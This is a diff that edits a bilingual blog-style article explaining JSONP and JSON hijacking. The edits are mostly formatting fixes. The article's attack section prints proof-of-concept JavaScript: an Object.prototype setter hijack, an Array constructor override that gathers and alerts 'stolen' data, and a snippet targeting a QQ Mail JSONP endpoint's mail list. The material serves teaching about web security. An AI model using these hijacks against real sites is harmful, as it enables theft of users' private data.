@@ -38,33 +38,26 @@ Json Hijacking攻击的思想见下图：
 ``` 
 script = document.createElement('script');
 script.type = 'text/javascript';
-script.src = 'http://www.someWebApiServer.com/some-data';</td>
+script.src = 'http://www.someWebApiServer.com/some-data';
 ``` 
-
 You will end up with a script segment that looks like this after it loads the data:
-
 ``` 
 {['some string 1', 'some data', 'whatever data']}
 ``` 
-
 However this is a bit inconvenient, because we have to fetch this array from script tag. So JSONPcreators decided that this will work better(and it is):
-
 ```
 script = document.createElement('script');
 script.type = 'text/javascript';
 script.src = 'http://www.someWebApiServer.com/some-data?callback=my_callback';</td>
 ``` 
-
 Notice the my_callback function over there? So - when JSONP server receives your request and finds callback parameter - instead of returning plain js array it'll return this:
-
 ``` 
 my_callback({['some string 1', 'some data', 'whatever data']});</td>
 ``` 
-
 See where the profit is: now we get automatic callback (my_callback) that'll be triggered once we get the data.That's all there is to know about JSONP: it's a callback and script tags.，NOTE: these are simple examples of JSONP usage, these are not production ready scripts.
-
 ``` 
-Basic JavaScript example (simple Twitter feed using JSONP)
+//Basic JavaScript example (simple Twitter feed using JSONP)
+
 <html>
 <head>
 </head>;
@@ -84,71 +77,44 @@ document.getElementById('twitterFeed').innerHTML = text;
 <script type="text/javascript" src="http://twitter.com/status/user_timeline/padraicb.json?count=10&amp;callback=myCallback"></script>
 </body>
 </html>
-``` 
-**Basic jQuery example (simple Twitter feed using JSONP)
-**
+
+//Basic jQuery example (simple Twitter feed using JSONP)
 
 <html>
-
 <head>
-
 <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js"></script>
-
 <script>
-
 $(document).ready(function(){
-
 $.ajax({
-
 	url: 'http://twitter.com/status/user_timeline/padraicb.json?count=10',
-
 	dataType: 'jsonp',
-
 	success: function(dataWeGotViaJsonp){
-
 	var text = '';
-
 	var len = dataWeGotViaJsonp.length;
-
-for(var i=0;i<len;i++){
-
-twitterEntry = dataWeGotViaJsonp[i];
-
+    for(var i=0;i<len;i++){
+	twitterEntry = dataWeGotViaJsonp[i];
 text += '<p><img src = "' + twitterEntry.user.profile_image_url_https +'"/>' + twitterEntry['text'] + '</p>'
-
 }
-
 $('#twitterFeed').html(text);
-
 }
-
 });
-
 })
-
 </script>
-
 </head>
-
 <body>
-
 <div id = 'twitterFeed'></div>
-
 </body>
-
-</html></td>
+</html>
 ``` 
 
 JSONP stands for JSON with Padding. (very poorly named technique as it really has nothing to do with what most people would think of as "padding".)
 
-
-总结：AJAX的底层原理是XMLHttpRequest，但是由于浏览器的同源策略，无论是get还是post请求，均不允许进行跨域操作，但是html对js和css则没有限制，这要是网站优化动静态元素分离的一个基础，JSONP就是基于此事实，去后台请求时返回可以执行的JS,例如<script type="text/javascript" src="https://ajax.min.js"></script> 返回mycallback({'id':'123'}，如果此刻在页面中有函数，Function mycallback(obj){alert(obj.id)} 则能正常的返回
-
+总结：AJAX的底层原理是XMLHttpRequest，但是由于浏览器的同源策略，无论是get还是post请求，均不允许进行跨域操作，但是html对js和css则没有限制，这要是网站优化动静态元素分离的一个基础，JSONP就是基于此事实，去后台请求时返回可以执行的JS,返回mycallback({'id':'123'}，如果此刻在页面中有函数，Function mycallback(obj){alert(obj.id)} 则能正常的返回
 
 ## 2.攻击举例
 
-实际应用中返回的数据格式有两种，一种是数据，一种是对象
-对象的攻击方式
+实际应用中返回的数据格式有两种，一种是数据，一种是对象  
+** 对象的攻击方式** 
 
 ``` 
 <html>
@@ -161,29 +127,19 @@ Object.prototype.__defineSetter__('Id', function(obj){alert(obj);});
 </body>
 </html>
 ``` 
-<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">其中用到了Javascript的原型，如果对Javascript的原型不够熟悉，可以参考之前的文章[《【编程语言】深刻理解javascript原型（_proto_）》](http://helloword.1kapp.com/archives/1056)
-</span>
+其中用到了Javascript的原型，如果对Javascript的原型不够熟悉，可以参考之前的文章[《【编程语言】深刻理解javascript原型（_proto_）》](http://helloword.1kapp.com/archives/1056)
 
 **数组的攻击方式**
 ``` 
 var secrets;
-
 Array = function() {
-
 secrets = this;
-
 };
-
 var yourData = '';
-
 var i = -1;
-
 while(secrets[++i]) {
-
 yourData += secrets[i] + ' ';
-
 }
-
 alert('I stole your data: ' + yourData);
 
 ``` 
@@ -192,13 +148,9 @@ alert('I stole your data: ' + yourData);
 
 ``` 
 var Qmail={};
-
 fun=passport&amp;target=MLIST&amp;t=login.js&amp;pagesize=10&amp;resp_charset=gb2312&amp;1=3"></script>
-
 alert(Qmail.newMailsList.nextUrl);
-
 alert(document.scripts[1].src=Qmail.newMailsList.nextUrl);
-
 alert(Qmail.newMailsList.summary);
 ``` 
 
